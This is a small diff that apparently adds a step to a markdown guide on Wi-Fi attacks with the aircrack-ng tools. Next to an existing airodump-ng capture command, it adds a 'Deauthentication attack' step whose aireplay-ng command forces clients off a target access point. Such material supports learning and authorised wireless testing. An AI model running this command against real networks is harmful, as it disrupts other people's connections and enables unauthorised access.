@@ -156,4 +156,9 @@ airodump-ng wlan0mon
 ```
 sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
 ```
+4. Deauthentication attack
+```
+aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
+```
+
 
